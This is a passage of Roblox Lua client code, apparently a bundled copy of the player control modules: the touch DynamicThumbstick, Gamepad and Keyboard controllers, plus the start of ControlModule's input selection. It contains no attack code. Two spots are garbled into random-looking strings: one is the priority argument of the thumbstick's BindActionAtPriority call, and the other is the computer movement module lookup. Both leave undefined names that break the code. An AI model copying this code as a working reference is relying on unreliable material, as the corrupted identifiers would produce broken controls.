			spacing = distAvailable / NUM_MIDDLE_IMAGES
		end
	
		for i = 1, NUM_MIDDLE_IMAGES do
			local image = self.middleImages[i]
			local distWithout = startDist + (spacing * (i - 2))
			local currentDist = startDist + (spacing * (i - 1))
	
			if distWithout < distAvailable then
				local pos = endPos - direction * currentDist
				local exposedFraction = math.clamp(1 - ((currentDist - distAvailable) / spacing), 0, 1)
	
				image.Visible = true
				image.Position = UDim2.new(0, pos.X, 0, pos.Y)
				image.Size = UDim2.new(0, self.middleSize * exposedFraction, 0, self.middleSize * exposedFraction)
			else
				image.Visible = false
			end
		end
	end
	
	function DynamicThumbstick:MoveStick(pos)
		local vector2StartPosition = Vector2.new(self.moveTouchStartPosition.X, self.moveTouchStartPosition.Y)
		local startPos = vector2StartPosition - self.thumbstickFrame.AbsolutePosition
		local endPos = Vector2.new(pos.X, pos.Y) - self.thumbstickFrame.AbsolutePosition
		self.endImage.Position = UDim2.new(0, endPos.X, 0, endPos.Y)
		self:LayoutMiddleImages(startPos, endPos)
	end
	
	function DynamicThumbstick:BindContextActions()
		local function inputBegan(inputObject)
			if self.moveTouchObject then
				return Enum.ContextActionResult.Pass
			end
	
			if not self:InputInFrame(inputObject) then
				return Enum.ContextActionResult.Pass
			end
	
			if self.isFirstTouch then
				self.isFirstTouch = false
				local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out,0,false,0)
				TweenService:Create(self.startImage, tweenInfo, {Size = UDim2.new(0, 0, 0, 0)}):Play()
				TweenService:Create(
					self.endImage,
					tweenInfo,
					{Size = UDim2.new(0, self.thumbstickSize, 0, self.thumbstickSize), ImageColor3 = Color3.new(0,0,0)}
				):Play()
			end
	
			self.moveTouchLockedIn = false
			self.moveTouchObject = inputObject
			self.moveTouchStartPosition = inputObject.Position
			self.moveTouchFirstChanged = true
	
			if FADE_IN_OUT_BACKGROUND then
				self:DoFadeInBackground()
			end
	
			return Enum.ContextActionResult.Pass
		end
	
		local function inputChanged(inputObject)
			if inputObject == self.moveTouchObject then
				if self.moveTouchFirstChanged then
					self.moveTouchFirstChanged = false
	
					local startPosVec2 = Vector2.new(
						inputObject.Position.X - self.thumbstickFrame.AbsolutePosition.X,
						inputObject.Position.Y - self.thumbstickFrame.AbsolutePosition.Y
					)
					self.startImage.Visible = true
					self.startImage.Position = UDim2.new(0, startPosVec2.X, 0, startPosVec2.Y)
					self.endImage.Visible = true
					self.endImage.Position = self.startImage.Position
	
					self:FadeThumbstick(true)
					self:MoveStick(inputObject.Position)
				end
	
				self.moveTouchLockedIn = true
	
				local direction = Vector2.new(
					inputObject.Position.x - self.moveTouchStartPosition.x,
					inputObject.Position.y - self.moveTouchStartPosition.y
				)
				if math.abs(direction.x) > 0 or math.abs(direction.y) > 0 then
					self:DoMove(direction)
					self:MoveStick(inputObject.Position)
				end
				return Enum.ContextActionResult.Sink
			end
			return Enum.ContextActionResult.Pass
		end
	
		local function inputEnded(inputObject)
			if inputObject == self.moveTouchObject then
				self:OnInputEnded()
				if self.moveTouchLockedIn then
					return Enum.ContextActionResult.Sink
				end
			end
			return Enum.ContextActionResult.Pass
		end
	
		local function handleInput(actionName, inputState, inputObject)
			if inputState == Enum.UserInputState.Begin then
				return inputBegan(inputObject)
			elseif inputState == Enum.UserInputState.Change then
				return inputChanged(inputObject)
			elseif inputState == Enum.UserInputState.End then
				return inputEnded(inputObject)
			elseif inputState == Enum.UserInputState.Cancel then
				self:OnInputEnded()
			end
		end
	
		ContextActionService:BindActionAtPriority(
			DYNAMIC_THUMBSTICK_ACTION_NAME,
			handleInput,
			false,
			DE1aWk5C9Eo5cPj5dhmsiVQNwrb61yyFbn,
			Enum.UserInputType.Touch)
	end
	
	function DynamicThumbstick:Create(parentFrame)
		if self.thumbstickFrame then
			self.thumbstickFrame:Destroy()
			self.thumbstickFrame = nil
			if self.onRenderSteppedConn then
				self.onRenderSteppedConn:Disconnect()
				self.onRenderSteppedConn = nil
			end
		end
	
		self.thumbstickSize = 45
		self.thumbstickRingSize = 20
		self.middleSize = 10
		self.middleSpacing = self.middleSize + 4
		self.radiusOfDeadZone = 2
		self.radiusOfMaxSpeed = 20
	
		local screenSize = parentFrame.AbsoluteSize
		local isBigScreen = math.min(screenSize.x, screenSize.y) > 500
		if isBigScreen then
			self.thumbstickSize = self.thumbstickSize * 2
			self.thumbstickRingSize = self.thumbstickRingSize * 2
			self.middleSize = self.middleSize * 2
			self.middleSpacing = self.middleSpacing * 2
			self.radiusOfDeadZone = self.radiusOfDeadZone * 2
			self.radiusOfMaxSpeed = self.radiusOfMaxSpeed * 2
		end
	
		local function layoutThumbstickFrame(portraitMode)
			if portraitMode then
				self.thumbstickFrame.Size = UDim2.new(1, 0, 0.4, 0)
				self.thumbstickFrame.Position = UDim2.new(0, 0, 0.6, 0)
			else
				self.thumbstickFrame.Size = UDim2.new(0.4, 0, 2/3, 0)
				self.thumbstickFrame.Position = UDim2.new(0, 0, 1/3, 0)
			end
		end
	
		self.thumbstickFrame = Instance.new("Frame")
		self.thumbstickFrame.BorderSizePixel = 0
		self.thumbstickFrame.Name = "DynamicThumbstickFrame"
		self.thumbstickFrame.Visible = false
		self.thumbstickFrame.BackgroundTransparency = 1.0
		self.thumbstickFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		self.thumbstickFrame.Active = false
		layoutThumbstickFrame(false)
	
		self.startImage = Instance.new("ImageLabel")
		self.startImage.Name = "ThumbstickStart"
		self.startImage.Visible = true
		self.startImage.BackgroundTransparency = 1
		self.startImage.Image = TOUCH_CONTROLS_SHEET
		self.startImage.ImageRectOffset = Vector2.new(1,1)
		self.startImage.ImageRectSize = Vector2.new(144, 144)
		self.startImage.ImageColor3 = Color3.new(0, 0, 0)
		self.startImage.AnchorPoint = Vector2.new(0.5, 0.5)
		self.startImage.Position = UDim2.new(0, self.thumbstickRingSize * 3.3, 1, -self.thumbstickRingSize  * 2.8)
		self.startImage.Size = UDim2.new(0, self.thumbstickRingSize  * 3.7, 0, self.thumbstickRingSize  * 3.7)
		self.startImage.ZIndex = 10
		self.startImage.Parent = self.thumbstickFrame
	
		self.endImage = Instance.new("ImageLabel")
		self.endImage.Name = "ThumbstickEnd"
		self.endImage.Visible = true
		self.endImage.BackgroundTransparency = 1
		self.endImage.Image = TOUCH_CONTROLS_SHEET
		self.endImage.ImageRectOffset = Vector2.new(1,1)
		self.endImage.ImageRectSize =  Vector2.new(144, 144)
		self.endImage.AnchorPoint = Vector2.new(0.5, 0.5)
		self.endImage.Position = self.startImage.Position
		self.endImage.Size = UDim2.new(0, self.thumbstickSize * 0.8, 0, self.thumbstickSize * 0.8)
		self.endImage.ZIndex = 10
		self.endImage.Parent = self.thumbstickFrame
	
		for i = 1, NUM_MIDDLE_IMAGES do
			self.middleImages[i] = Instance.new("ImageLabel")
			self.middleImages[i].Name = "ThumbstickMiddle"
			self.middleImages[i].Visible = false
			self.middleImages[i].BackgroundTransparency = 1
			self.middleImages[i].Image = TOUCH_CONTROLS_SHEET
			self.middleImages[i].ImageRectOffset = Vector2.new(1,1)
			self.middleImages[i].ImageRectSize = Vector2.new(144, 144)
			self.middleImages[i].ImageTransparency = MIDDLE_TRANSPARENCIES[i]
			self.middleImages[i].AnchorPoint = Vector2.new(0.5, 0.5)
			self.middleImages[i].ZIndex = 9
			self.middleImages[i].Parent = self.thumbstickFrame
		end
	
		local CameraChangedConn = nil
		local function onCurrentCameraChanged()
			if CameraChangedConn then
				CameraChangedConn:Disconnect()
				CameraChangedConn = nil
			end
			local newCamera = workspace.CurrentCamera
			if newCamera then
				local function onViewportSizeChanged()
					local size = newCamera.ViewportSize
					local portraitMode = size.X < size.Y
					layoutThumbstickFrame(portraitMode)
				end
				CameraChangedConn = newCamera:GetPropertyChangedSignal("ViewportSize"):Connect(onViewportSizeChanged)
				onViewportSizeChanged()
			end
		end
		workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(onCurrentCameraChanged)
		if workspace.CurrentCamera then
			onCurrentCameraChanged()
		end
	
		self.moveTouchStartPosition = nil
	
		self.startImageFadeTween = nil
		self.endImageFadeTween = nil
		self.middleImageFadeTweens = {}
	
		self.onRenderSteppedConn = RunService.RenderStepped:Connect(function()
			if self.tweenInAlphaStart ~= nil then
				local delta = tick() - self.tweenInAlphaStart
				local fadeInTime = (self.fadeInAndOutHalfDuration * 2 * self.fadeInAndOutBalance)
				self.thumbstickFrame.BackgroundTransparency = 1 - FADE_IN_OUT_MAX_ALPHA*math.min(delta/fadeInTime, 1)
				if delta > fadeInTime then
					self.tweenOutAlphaStart = tick()
					self.tweenInAlphaStart = nil
				end
			elseif self.tweenOutAlphaStart ~= nil then
				local delta = tick() - self.tweenOutAlphaStart
				local fadeOutTime = (self.fadeInAndOutHalfDuration * 2) - (self.fadeInAndOutHalfDuration * 2 * self.fadeInAndOutBalance)
				self.thumbstickFrame.BackgroundTransparency = 1 - FADE_IN_OUT_MAX_ALPHA + FADE_IN_OUT_MAX_ALPHA*math.min(delta/fadeOutTime, 1)
				if delta > fadeOutTime  then
					self.tweenOutAlphaStart = nil
				end
			end
		end)
	
		self.onTouchEndedConn = UserInputService.TouchEnded:connect(function(inputObject)
			if inputObject == self.moveTouchObject then
				self:OnInputEnded()
			end
		end)
	
		GuiService.MenuOpened:connect(function()
			if self.moveTouchObject then
				self:OnInputEnded()
			end
		end)
	
		local playerGui = LocalPlayer:FindFirstChildOfClass("PlayerGui")
		while not playerGui do
			LocalPlayer.ChildAdded:wait()
			playerGui = LocalPlayer:FindFirstChildOfClass("PlayerGui")
		end
	
		local playerGuiChangedConn = nil
		local originalScreenOrientationWasLandscape =	playerGui.CurrentScreenOrientation == Enum.ScreenOrientation.LandscapeLeft or
														playerGui.CurrentScreenOrientation == Enum.ScreenOrientation.LandscapeRight
	
		local function longShowBackground()
			self.fadeInAndOutHalfDuration = 2.5
			self.fadeInAndOutBalance = 0.05
			self.tweenInAlphaStart = tick()
		end
	
		playerGuiChangedConn = playerGui:GetPropertyChangedSignal("CurrentScreenOrientation"):Connect(function()
			if (originalScreenOrientationWasLandscape and playerGui.CurrentScreenOrientation == Enum.ScreenOrientation.Portrait) or
				(not originalScreenOrientationWasLandscape and playerGui.CurrentScreenOrientation ~= Enum.ScreenOrientation.Portrait) then
	
				playerGuiChangedConn:disconnect()
				longShowBackground()
	
				if originalScreenOrientationWasLandscape then
					self.hasFadedBackgroundInPortrait = true
				else
					self.hasFadedBackgroundInLandscape = true
				end
			end
		end)
	
		self.thumbstickFrame.Parent = parentFrame
	
		if game:IsLoaded() then
			longShowBackground()
		else
			coroutine.wrap(function()
				game.Loaded:Wait()
				longShowBackground()
			end)()
		end
	end
	
	return DynamicThumbstick
end

function _Gamepad()
	local UserInputService = game:GetService("UserInputService")
	local ContextActionService = game:GetService("ContextActionService")
	
	--[[ Constants ]]--
	local ZERO_VECTOR3 = Vector3.new(0,0,0)
	local NONE = Enum.UserInputType.None
	local thumbstickDeadzone = 0.2
	
	--[[ The Module ]]--
	local BaseCharacterController = _BaseCharacterController()
	local Gamepad = setmetatable({}, BaseCharacterController)
	Gamepad.__index = Gamepad
	
	function Gamepad.new(CONTROL_ACTION_PRIORITY)
		local self = setmetatable(BaseCharacterController.new(), Gamepad)
	
		self.CONTROL_ACTION_PRIORITY = CONTROL_ACTION_PRIORITY
	
		self.forwardValue  = 0
		self.backwardValue = 0
		self.leftValue = 0
		self.rightValue = 0
	
		self.activeGamepad = NONE	-- Enum.UserInputType.Gamepad1, 2, 3...
		self.gamepadConnectedConn = nil
		self.gamepadDisconnectedConn = nil
		return self
	end
	
	function Gamepad:Enable(enable)
		if not UserInputService.GamepadEnabled then
			return false
		end
	
		if enable == self.enabled then
			-- Module is already in the state being requested. True is returned here since the module will be in the state
			-- expected by the code that follows the Enable() call. This makes more sense than returning false to indicate
			-- no action was necessary. False indicates failure to be in requested/expected state.
			return true
		end
	
		self.forwardValue  = 0
		self.backwardValue = 0
		self.leftValue = 0
		self.rightValue = 0
		self.moveVector = ZERO_VECTOR3
		self.isJumping = false
	
		if enable then
			self.activeGamepad = self:GetHighestPriorityGamepad()
			if self.activeGamepad ~= NONE then
				self:BindContextActions()
				self:ConnectGamepadConnectionListeners()
			else
				-- No connected gamepads, failure to enable
				return false
			end
		else
			self:UnbindContextActions()
			self:DisconnectGamepadConnectionListeners()
			self.activeGamepad = NONE
		end
	
		self.enabled = enable
		return true
	end
	
	-- This function selects the lowest number gamepad from the currently-connected gamepad
	-- and sets it as the active gamepad
	function Gamepad:GetHighestPriorityGamepad()
		local connectedGamepads = UserInputService:GetConnectedGamepads()
		local bestGamepad = NONE -- Note that this value is higher than all valid gamepad values
		for _, gamepad in pairs(connectedGamepads) do
			if gamepad.Value < bestGamepad.Value then
				bestGamepad = gamepad
			end
		end
		return bestGamepad
	end
	
	function Gamepad:BindContextActions()
	
		if self.activeGamepad == NONE then
			-- There must be an active gamepad to set up bindings
			return false
		end
	
		local handleJumpAction = function(actionName, inputState, inputObject)
			self.isJumping = (inputState == Enum.UserInputState.Begin)
			return Enum.ContextActionResult.Sink
		end
	
		local handleThumbstickInput = function(actionName, inputState, inputObject)
	
			if inputState == Enum.UserInputState.Cancel then
				self.moveVector = ZERO_VECTOR3
				return Enum.ContextActionResult.Sink
			end
	
			if self.activeGamepad ~= inputObject.UserInputType then
				return Enum.ContextActionResult.Pass
			end
			if inputObject.KeyCode ~= Enum.KeyCode.Thumbstick1 then return end
	
			if inputObject.Position.magnitude > thumbstickDeadzone then
				self.moveVector  =  Vector3.new(inputObject.Position.X, 0, -inputObject.Position.Y)
			else
				self.moveVector = ZERO_VECTOR3
			end
			return Enum.ContextActionResult.Sink
		end
	
		ContextActionService:BindActivate(self.activeGamepad, Enum.KeyCode.ButtonR2)
		ContextActionService:BindActionAtPriority("jumpAction", handleJumpAction, false,
			self.CONTROL_ACTION_PRIORITY, Enum.KeyCode.ButtonA)
		ContextActionService:BindActionAtPriority("moveThumbstick", handleThumbstickInput, false,
			self.CONTROL_ACTION_PRIORITY, Enum.KeyCode.Thumbstick1)
	
		return true
	end
	
	function Gamepad:UnbindContextActions()
		if self.activeGamepad ~= NONE then
			ContextActionService:UnbindActivate(self.activeGamepad, Enum.KeyCode.ButtonR2)
		end
		ContextActionService:UnbindAction("moveThumbstick")
		ContextActionService:UnbindAction("jumpAction")
	end
	
	function Gamepad:OnNewGamepadConnected()
		-- A new gamepad has been connected.
		local bestGamepad = self:GetHighestPriorityGamepad()
	
		if bestGamepad == self.activeGamepad then
			-- A new gamepad was connected, but our active gamepad is not changing
			return
		end
	
		if bestGamepad == NONE then
			-- There should be an active gamepad when GamepadConnected fires, so this should not
			-- normally be hit. If there is no active gamepad, unbind actions but leave
			-- the module enabled and continue to listen for a new gamepad connection.
			warn("Gamepad:OnNewGamepadConnected found no connected gamepads")
			self:UnbindContextActions()
			return
		end
	
		if self.activeGamepad ~= NONE then
			-- Switching from one active gamepad to another
			self:UnbindContextActions()
		end
	
		self.activeGamepad = bestGamepad
		self:BindContextActions()
	end
	
	function Gamepad:OnCurrentGamepadDisconnected()
		if self.activeGamepad ~= NONE then
			ContextActionService:UnbindActivate(self.activeGamepad, Enum.KeyCode.ButtonR2)
		end
	
		local bestGamepad = self:GetHighestPriorityGamepad()
	
		if self.activeGamepad ~= NONE and bestGamepad == self.activeGamepad then
			warn("Gamepad:OnCurrentGamepadDisconnected found the supposedly disconnected gamepad in connectedGamepads.")
			self:UnbindContextActions()
			self.activeGamepad = NONE
			return
		end
	
		if bestGamepad == NONE then
			-- No active gamepad, unbinding actions but leaving gamepad connection listener active
			self:UnbindContextActions()
			self.activeGamepad = NONE
		else
			-- Set new gamepad as active and bind to tool activation
			self.activeGamepad = bestGamepad
			ContextActionService:BindActivate(self.activeGamepad, Enum.KeyCode.ButtonR2)
		end
	end
	
	function Gamepad:ConnectGamepadConnectionListeners()
		self.gamepadConnectedConn = UserInputService.GamepadConnected:Connect(function(gamepadEnum)
			self:OnNewGamepadConnected()
		end)
	
		self.gamepadDisconnectedConn = UserInputService.GamepadDisconnected:Connect(function(gamepadEnum)
			if self.activeGamepad == gamepadEnum then
				self:OnCurrentGamepadDisconnected()
			end
		end)
	
	end
	
	function Gamepad:DisconnectGamepadConnectionListeners()
		if self.gamepadConnectedConn then
			self.gamepadConnectedConn:Disconnect()
			self.gamepadConnectedConn = nil
		end
	
		if self.gamepadDisconnectedConn then
			self.gamepadDisconnectedConn:Disconnect()
			self.gamepadDisconnectedConn = nil
		end
	end
	
	return Gamepad
end

function _Keyboard()
	
	--[[ Roblox Services ]]--
	local UserInputService = game:GetService("UserInputService")
	local ContextActionService = game:GetService("ContextActionService")
	
	--[[ Constants ]]--
	local ZERO_VECTOR3 = Vector3.new(0,0,0)
	
	--[[ The Module ]]--
	local BaseCharacterController = _BaseCharacterController()
	local Keyboard = setmetatable({}, BaseCharacterController)
	Keyboard.__index = Keyboard
	
	function Keyboard.new(CONTROL_ACTION_PRIORITY)
		local self = setmetatable(BaseCharacterController.new(), Keyboard)
	
		self.CONTROL_ACTION_PRIORITY = CONTROL_ACTION_PRIORITY
	
		self.textFocusReleasedConn = nil
		self.textFocusGainedConn = nil
		self.windowFocusReleasedConn = nil
	
		self.forwardValue  = 0
		self.backwardValue = 0
		self.leftValue = 0
		self.rightValue = 0
	
		self.jumpEnabled = true
	
		return self
	end
	
	function Keyboard:Enable(enable)
		if not UserInputService.KeyboardEnabled then
			return false
		end
	
		if enable == self.enabled then
			-- Module is already in the state being requested. True is returned here since the module will be in the state
			-- expected by the code that follows the Enable() call. This makes more sense than returning false to indicate
			-- no action was necessary. False indicates failure to be in requested/expected state.
			return true
		end
	
		self.forwardValue  = 0
		self.backwardValue = 0
		self.leftValue = 0
		self.rightValue = 0
		self.moveVector = ZERO_VECTOR3
		self.jumpRequested = false
		self:UpdateJump()
	
		if enable then
			self:BindContextActions()
			self:ConnectFocusEventListeners()
		else
			self:UnbindContextActions()
			self:DisconnectFocusEventListeners()
		end
	
		self.enabled = enable
		return true
	end
	
	function Keyboard:UpdateMovement(inputState)
		if inputState == Enum.UserInputState.Cancel then
			self.moveVector = ZERO_VECTOR3
		else
			self.moveVector = Vector3.new(self.leftValue + self.rightValue, 0, self.forwardValue + self.backwardValue)
		end
	end
	
	function Keyboard:UpdateJump()
		self.isJumping = self.jumpRequested
	end
	
	function Keyboard:BindContextActions()
	
		-- Note: In the previous version of this code, the movement values were not zeroed-out on UserInputState. Cancel, now they are,
		-- which fixes them from getting stuck on.
		-- We return ContextActionResult.Pass here for legacy reasons.
		-- Many games rely on gameProcessedEvent being false on UserInputService.InputBegan for these control actions.
		local handleMoveForward = function(actionName, inputState, inputObject)
			self.forwardValue = (inputState == Enum.UserInputState.Begin) and -1 or 0
			self:UpdateMovement(inputState)
			return Enum.ContextActionResult.Pass
		end
	
		local handleMoveBackward = function(actionName, inputState, inputObject)
			self.backwardValue = (inputState == Enum.UserInputState.Begin) and 1 or 0
			self:UpdateMovement(inputState)
			return Enum.ContextActionResult.Pass
		end
	
		local handleMoveLeft = function(actionName, inputState, inputObject)
			self.leftValue = (inputState == Enum.UserInputState.Begin) and -1 or 0
			self:UpdateMovement(inputState)
			return Enum.ContextActionResult.Pass
		end
	
		local handleMoveRight = function(actionName, inputState, inputObject)
			self.rightValue = (inputState == Enum.UserInputState.Begin) and 1 or 0
			self:UpdateMovement(inputState)
			return Enum.ContextActionResult.Pass
		end
	
		local handleJumpAction = function(actionName, inputState, inputObject)
			self.jumpRequested = self.jumpEnabled and (inputState == Enum.UserInputState.Begin)
			self:UpdateJump()
			return Enum.ContextActionResult.Pass
		end
	
		-- TODO: Revert to KeyCode bindings so that in the future the abstraction layer from actual keys to
		-- movement direction is done in Lua
		ContextActionService:BindActionAtPriority("moveForwardAction", handleMoveForward, false,
			self.CONTROL_ACTION_PRIORITY, Enum.PlayerActions.CharacterForward)
		ContextActionService:BindActionAtPriority("moveBackwardAction", handleMoveBackward, false,
			self.CONTROL_ACTION_PRIORITY, Enum.PlayerActions.CharacterBackward)
		ContextActionService:BindActionAtPriority("moveLeftAction", handleMoveLeft, false,
			self.CONTROL_ACTION_PRIORITY, Enum.PlayerActions.CharacterLeft)
		ContextActionService:BindActionAtPriority("moveRightAction", handleMoveRight, false,
			self.CONTROL_ACTION_PRIORITY, Enum.PlayerActions.CharacterRight)
		ContextActionService:BindActionAtPriority("jumpAction", handleJumpAction, false,
			self.CONTROL_ACTION_PRIORITY, Enum.PlayerActions.CharacterJump)
	end
	
	function Keyboard:UnbindContextActions()
		ContextActionService:UnbindAction("moveForwardAction")
		ContextActionService:UnbindAction("moveBackwardAction")
		ContextActionService:UnbindAction("moveLeftAction")
		ContextActionService:UnbindAction("moveRightAction")
		ContextActionService:UnbindAction("jumpAction")
	end
	
	function Keyboard:ConnectFocusEventListeners()
		local function onFocusReleased()
			self.moveVector = ZERO_VECTOR3
			self.forwardValue  = 0
			self.backwardValue = 0
			self.leftValue = 0
			self.rightValue = 0
			self.jumpRequested = false
			self:UpdateJump()
		end
	
		local function onTextFocusGained(textboxFocused)
			self.jumpRequested = false
			self:UpdateJump()
		end
	
		self.textFocusReleasedConn = UserInputService.TextBoxFocusReleased:Connect(onFocusReleased)
		self.textFocusGainedConn = UserInputService.TextBoxFocused:Connect(onTextFocusGained)
		self.windowFocusReleasedConn = UserInputService.WindowFocused:Connect(onFocusReleased)
	end
	
	function Keyboard:DisconnectFocusEventListeners()
		if self.textFocusReleasedCon then
			self.textFocusReleasedCon:Disconnect()
			self.textFocusReleasedCon = nil
		end
		if self.textFocusGainedConn then
			self.textFocusGainedConn:Disconnect()
			self.textFocusGainedConn = nil
		end
		if self.windowFocusReleasedConn then
			self.windowFocusReleasedConn:Disconnect()
			self.windowFocusReleasedConn = nil
		end
	end
	
	return Keyboard
end

function _ControlModule()
	local ControlModule = {}
	ControlModule.__index = ControlModule
	
	--[[ Roblox Services ]]--
	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	local UserInputService = game:GetService("UserInputService")
	local Workspace = game:GetService("Workspace")
	local UserGameSettings = UserSettings():GetService("UserGameSettings")
	
	-- Roblox User Input Control Modules - each returns a new() constructor function used to create controllers as needed
	local Keyboard = _Keyboard()
	local Gamepad = _Gamepad()
	local DynamicThumbstick = _DynamicThumbstick()
	
	local FFlagUserMakeThumbstickDynamic do
		local success, value = pcall(function()
			return UserSettings():IsUserFeatureEnabled("UserMakeThumbstickDynamic")
		end)
		FFlagUserMakeThumbstickDynamic = success and value
	end
	
	local TouchThumbstick = FFlagUserMakeThumbstickDynamic and DynamicThumbstick or _TouchThumbstick()
	
	-- These controllers handle only walk/run movement, jumping is handled by the
	-- TouchJump controller if any of these are active
	local ClickToMove = _ClickToMoveController()
	local TouchJump = _TouchJump()
	
	local VehicleController = _VehicleController()
	
	local CONTROL_ACTION_PRIORITY = Enum.ContextActionPriority.Default.Value
	
	-- Mapping from movement mode and lastInputType enum values to control modules to avoid huge if elseif switching
	local movementEnumToModuleMap = {
		[Enum.TouchMovementMode.DPad] = DynamicThumbstick,
		[Enum.DevTouchMovementMode.DPad] = DynamicThumbstick,
		[Enum.TouchMovementMode.Thumbpad] = DynamicThumbstick,
		[Enum.DevTouchMovementMode.Thumbpad] = DynamicThumbstick,
		[Enum.TouchMovementMode.Thumbstick] = TouchThumbstick,
		[Enum.DevTouchMovementMode.Thumbstick] = TouchThumbstick,
		[Enum.TouchMovementMode.DynamicThumbstick] = DynamicThumbstick,
		[Enum.DevTouchMovementMode.DynamicThumbstick] = DynamicThumbstick,
		[Enum.TouchMovementMode.ClickToMove] = ClickToMove,
		[Enum.DevTouchMovementMode.ClickToMove] = ClickToMove,
	
		-- Current default
		[Enum.TouchMovementMode.Default] = DynamicThumbstick,
	
		[Enum.ComputerMovementMode.Default] = Keyboard,
		[Enum.ComputerMovementMode.KeyboardMouse] = Keyboard,
		[Enum.DevComputerMovementMode.KeyboardMouse] = Keyboard,
		[Enum.DevComputerMovementMode.Scriptable] = nil,
		[Enum.ComputerMovementMode.ClickToMove] = ClickToMove,
		[Enum.DevComputerMovementMode.ClickToMove] = ClickToMove,
	}
	
	-- Keyboard controller is really keyboard and mouse controller
	local computerInputTypeToModuleMap = {
		[Enum.UserInputType.Keyboard] = Keyboard,
		[Enum.UserInputType.MouseButton1] = Keyboard,
		[Enum.UserInputType.MouseButton2] = Keyboard,
		[Enum.UserInputType.MouseButton3] = Keyboard,
		[Enum.UserInputType.MouseWheel] = Keyboard,
		[Enum.UserInputType.MouseMovement] = Keyboard,
		[Enum.UserInputType.Gamepad1] = Gamepad,
		[Enum.UserInputType.Gamepad2] = Gamepad,
		[Enum.UserInputType.Gamepad3] = Gamepad,
		[Enum.UserInputType.Gamepad4] = Gamepad,
	}
	
	local lastInputType
	
	function ControlModule.new()
		local self = setmetatable({},ControlModule)
	
		-- The Modules above are used to construct controller instances as-needed, and this
		-- table is a map from Module to the instance created from it
		self.controllers = {}
	
		self.activeControlModule = nil	-- Used to prevent unnecessarily expensive checks on each input event
		self.activeController = nil
		self.touchJumpController = nil
		self.moveFunction = Players.LocalPlayer.Move
		self.humanoid = nil
		self.lastInputType = Enum.UserInputType.None
	
		-- For Roblox self.vehicleController
		self.humanoidSeatedConn = nil
		self.vehicleController = nil
	
		self.touchControlFrame = nil
	
		self.vehicleController = VehicleController.new(CONTROL_ACTION_PRIORITY)
	
		Players.LocalPlayer.CharacterAdded:Connect(function(char) self:OnCharacterAdded(char) end)
		Players.LocalPlayer.CharacterRemoving:Connect(function(char) self:OnCharacterRemoving(char) end)
		if Players.LocalPlayer.Character then
			self:OnCharacterAdded(Players.LocalPlayer.Character)
		end
	
		RunService:BindToRenderStep("ControlScriptRenderstep", Enum.RenderPriority.Input.Value, function(dt)
			self:OnRenderStepped(dt)
		end)
	
		UserInputService.LastInputTypeChanged:Connect(function(newLastInputType)
			self:OnLastInputTypeChanged(newLastInputType)
		end)
	
	
		UserGameSettings:GetPropertyChangedSignal("TouchMovementMode"):Connect(function()
			self:OnTouchMovementModeChange()
		end)
		Players.LocalPlayer:GetPropertyChangedSignal("DevTouchMovementMode"):Connect(function()
			self:OnTouchMovementModeChange()
		end)
	
		UserGameSettings:GetPropertyChangedSignal("ComputerMovementMode"):Connect(function()
			self:OnComputerMovementModeChange()
		end)
		Players.LocalPlayer:GetPropertyChangedSignal("DevComputerMovementMode"):Connect(function()
			self:OnComputerMovementModeChange()
		end)
	
		--[[ Touch Device UI ]]--
		self.playerGui = nil
		self.touchGui = nil
		self.playerGuiAddedConn = nil
	
		if UserInputService.TouchEnabled then
			self.playerGui = Players.LocalPlayer:FindFirstChildOfClass("PlayerGui")
			if self.playerGui then
				self:CreateTouchGuiContainer()
				self:OnLastInputTypeChanged(UserInputService:GetLastInputType())
			else
				self.playerGuiAddedConn = Players.LocalPlayer.ChildAdded:Connect(function(child)
					if child:IsA("PlayerGui") then
						self.playerGui = child
						self:CreateTouchGuiContainer()
						self.playerGuiAddedConn:Disconnect()
						self.playerGuiAddedConn = nil
						self:OnLastInputTypeChanged(UserInputService:GetLastInputType())
					end
				end)
			end
		else
			self:OnLastInputTypeChanged(UserInputService:GetLastInputType())
		end
	
		return self
	end
	
	-- Convenience function so that calling code does not have to first get the activeController
	-- and then call GetMoveVector on it. When there is no active controller, this function returns
	-- nil so that this case can be distinguished from no current movement (which returns zero vector).
	function ControlModule:GetMoveVector()
		if self.activeController then
			return self.activeController:GetMoveVector()
		end
		return Vector3.new(0,0,0)
	end
	
	function ControlModule:GetActiveController()
		return self.activeController
	end
	
	function ControlModule:EnableActiveControlModule()
		if self.activeControlModule == ClickToMove then
			-- For ClickToMove, when it is the player's choice, we also enable the full keyboard controls.
			-- When the developer is forcing click to move, the most keyboard controls (WASD) are not available, only jump.
			self.activeController:Enable(
				true,
				Players.LocalPlayer.DevComputerMovementMode == Enum.DevComputerMovementMode.UserChoice,
				self.touchJumpController
			)
		elseif self.touchControlFrame then
			self.activeController:Enable(true, self.touchControlFrame)
		else
			self.activeController:Enable(true)
		end
	end
	
	function ControlModule:Enable(enable)
		if not self.activeController then
			return
		end
	
		if enable == nil then
			enable = true
		end
		if enable then
			self:EnableActiveControlModule()
		else
			self:Disable()
		end
	end
	
	-- For those who prefer distinct functions
	function ControlModule:Disable()
		if self.activeController then
			self.activeController:Enable(false)
	
			if self.moveFunction then
				self.moveFunction(Players.LocalPlayer, Vector3.new(0,0,0), true)
			end
		end
	end
	
	
	-- Returns module (possibly nil) and success code to differentiate returning nil due to error vs Scriptable
	function ControlModule:SelectComputerMovementModule()
		if not (UserInputService.KeyboardEnabled or UserInputService.GamepadEnabled) then
			return nil, false
		end
	
		local computerModule
		local DevMovementMode = Players.LocalPlayer.DevComputerMovementMode
	
		if DevMovementMode == Enum.DevComputerMovementMode.UserChoice then
			computerModule = computerhXwTBw2EjaJJMy9vvYExau1mRNSRiro1H8C
			if UserGameSettings.ComputerMovementMode == Enum.ComputerMovementMode.ClickToMove and computerModule == Keyboard then
				-- User has ClickToMove set in Settings, prefer ClickToMove controller for keyboard and mouse lastInputTypes
				computerModule = ClickToMove
			end
		else
			-- Developer has selected a mode that must be used.
			computerModule = movementEnumToModuleMap[DevMovementMode]
	
			-- computerModule is expected to be nil here only when developer has selected Scriptable
			if (not computerModule) and DevMovementMode ~= Enum.DevComputerMovementMode.Scriptable then
				warn("No character control module is associated with DevComputerMovementMode ", DevMovementMode)
			end
		end
	
		if computerModule then
			return computerModule, true
		elseif DevMovementMode == Enum.DevComputerMovementMode.Scriptable then
			-- Special case where nil is returned and we actually want to set self.activeController to nil for Scriptable
			return nil, true
		else
